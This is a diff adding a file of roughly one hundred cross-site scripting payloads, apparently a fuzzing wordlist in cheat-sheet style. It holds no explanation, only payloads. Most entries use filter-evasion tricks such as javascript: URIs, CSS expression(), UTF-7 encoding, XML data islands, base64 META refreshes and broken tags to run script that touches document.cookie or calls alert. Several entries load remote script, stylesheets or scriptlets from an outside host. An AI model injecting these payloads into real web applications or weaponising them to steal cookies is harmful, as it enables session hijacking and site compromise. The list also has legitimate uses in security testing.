@@ -1,0 +1,102 @@
+<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.cookie=true</SCRIPT>">
+<SCRIPT>document.cookie=true;</SCRIPT>
+<IMG SRC="jav ascript:document.cookie=true;">
+<IMG SRC="javascript:document.cookie=true;">
+<IMG SRC="  javascript:document.cookie=true;">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.cookie=true;>
+<SCRIPT>document.cookie=true;//<</SCRIPT>
+<SCRIPT <B>document.cookie=true;</SCRIPT>
+<IMG SRC="javascript:document.cookie=true;">
+<iframe src="javascript:document.cookie=true;> 
+<SCRIPT>a=/CrossSiteScripting/\ndocument.cookie=true;</SCRIPT> 
+</TITLE><SCRIPT>document.cookie=true;</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:document.cookie=true;">
+<BODY BACKGROUND="javascript:document.cookie=true;">
+<BODY ONLOAD=document.cookie=true;>
+<IMG DYNSRC="javascript:document.cookie=true;">
+<IMG LOWSRC="javascript:document.cookie=true;">
+<BGSOUND SRC="javascript:document.cookie=true;">
+<BR SIZE="&{document.cookie=true}">
+<LAYER SRC="javascript:document.cookie=true;"></LAYER>
+<LINK REL="stylesheet" HREF="javascript:document.cookie=true;">
+<STYLE>li {list-style-image: url("javascript:document.cookie=true;");</STYLE><UL><LI>CrossSiteScripting 
+¼script¾document.cookie=true;¼/script¾ 
+<IFRAME SRC="javascript:document.cookie=true;"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:document.cookie=true;"></FRAMESET>
+<TABLE BACKGROUND="javascript:document.cookie=true;">
+<TABLE><TD BACKGROUND="javascript:document.cookie=true;">
+<DIV STYLE="background-image: url(javascript:document.cookie=true;)">
+<DIV STYLE="background-image: url(javascript:document.cookie=true;)">
+<DIV STYLE="width: expression(document.cookie=true);">
+<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>
+<IMG STYLE="CrossSiteScripting:expr/*CrossSiteScripting*/ession(document.cookie=true)">
+<CrossSiteScripting STYLE="CrossSiteScripting:expression(document.cookie=true)"> 
+exp/*<A STYLE='no\CrossSiteScripting:noCrossSiteScripting("*//*");CrossSiteScripting:ex/*CrossSiteScripting*//*/*/pression(document.cookie=true)'> 
+<STYLE TYPE="text/javascript">document.cookie=true;</STYLE> 
+<STYLE>.CrossSiteScripting{background-image:url("javascript:document.cookie=true");}</STYLE><A CLASS=CrossSiteScripting></A> 
+<STYLE type="text/css">BODY{background:url("javascript:document.cookie=true")}</STYLE> 
+<SCRIPT>document.cookie=true;</SCRIPT>
+<BASE HREF="javascript:document.cookie=true;//">
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></OBJECT>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:document.cookie=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<XML ID="CrossSiteScripting"><I><B><IMG SRC="javas<!-- -->cript:document.cookie=true"></B></I></XML><SPAN DATASRC="#CrossSiteScripting" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="CrossSiteScripting<SCRIPT DEFER>document.cookie=true</SCRIPT>"></BODY></HTML>
+<? echo('<SCR)';echo('IPT>document.cookie=true</SCRIPT>'); ?>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.cookie=true;+ADw-/SCRIPT+AD4-
+<a href="javascript#document.cookie=true;">
+<div onmouseover="document.cookie=true;">
+<img src="javascript:document.cookie=true;">
+<img dynsrc="javascript:document.cookie=true;">
+<input type="image" dynsrc="javascript:document.cookie=true;">
+<bgsound src="javascript:document.cookie=true;">
+&<script>document.cookie=true;</script> 
+&{document.cookie=true;}; 
+<img src=&{document.cookie=true;};> 
+<link rel="stylesheet" href="javascript:document.cookie=true;"> 
+<img src="mocha:document.cookie=true;"> 
+<img src="livescript:document.cookie=true;"> 
+<a href="about:<script>document.cookie=true;</script>"> 
+<body onload="document.cookie=true;"> 
+<div style="background-image: url(javascript:document.cookie=true;);"> 
+<div style="behaviour: url([link to code]);"> 
+<div style="binding: url([link to code]);"> 
+<div style="width: expression(document.cookie=true;);">
+<style type="text/javascript">document.cookie=true;</style>
+<object classid="clsid:..." codebase="javascript:document.cookie=true;">
+<style><!--</style><script>document.cookie=true;//--></script>
+<<script>document.cookie=true;</script>
+<script>document.cookie=true;//--></script>
+<!-- -- --><script>document.cookie=true;</script><!-- -- -->
+<img src="blah"onmouseover="document.cookie=true;">
+<img src="blah>" onmouseover="document.cookie=true;">
+<xml src="javascript:document.cookie=true;">
+<xml id="X"><a><b><script>document.cookie=true;</script>;</b></a></xml>
+<div datafld="b" dataformatas="html" datasrc="#X"></div> ]]>  [\xC0][\xBC]script>document.cookie=true;[\xC0][\xBC]/script>
+<SCRIPT SRC=http://vulnerability-lab.com/CrossSiteScripting.js></SCRIPT>
+<<SCRIPT>alert("CrossSiteScripting");//<</SCRIPT>
+<SCRIPT SRC=http://vulnerability-lab.com/CrossSiteScripting.js?<B>
+<SCRIPT SRC=//vulnerability-lab.com/.js>
+<SCRIPT>a=/CrossSiteScripting/ alert(a.source)</SCRIPT>
+<SCRIPT a=">" SRC="http://vulnerability-lab.com/CrossSiteScripting.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://vulnerability-lab.com/CrossSiteScripting.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://vulnerability-lab.com/CrossSiteScripting.js"></SCRIPT>
+</TITLE><SCRIPT>alert("CrossSiteScripting");</SCRIPT>
+<STYLE>@im\port'\ja\vasc\ript:alert("CrossSiteScripting")';</STYLE>
+<STYLE>@import'http://vulnerability-lab.com/CrossSiteScripting.css';</STYLE>
+<STYLE TYPE="text/javascript">alert('CrossSiteScripting');</STYLE>
+<STYLE>.CrossSiteScripting{background-image:url("javascript:alert('CrossSiteScripting')");}</STYLE><A CLASS=CrossSiteScripting></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('CrossSiteScripting')")}</STYLE>
+<STYLE>li {list-style-image: url("javascript:alert('CrossSiteScripting')");}</STYLE><UL><LI>CrossSiteScripting
+<STYLE>BODY{-moz-binding:url("http://vulnerability-lab.com/CrossSiteScriptingmoz.xml#CrossSiteScripting")}</STYLE>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://vulnerability-lab.com/scriptlet.html"></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('CrossSiteScripting')></OBJECT>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('CrossSiteScripting');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('CrossSiteScripting');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('CrossSiteScripting');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=jAvAsCriPt:aLeRt('CroSsSiteScrIpting');">
+<META HTTP-EQUIV="Link" Content="<http://vulnerability-lab.com/CrossSiteScripting.css>; REL=stylesheet">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('CrossSiteScripting')</SCRIPT>">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('CrossSiteScripting');+ADw-/SCRIPT+AD4-
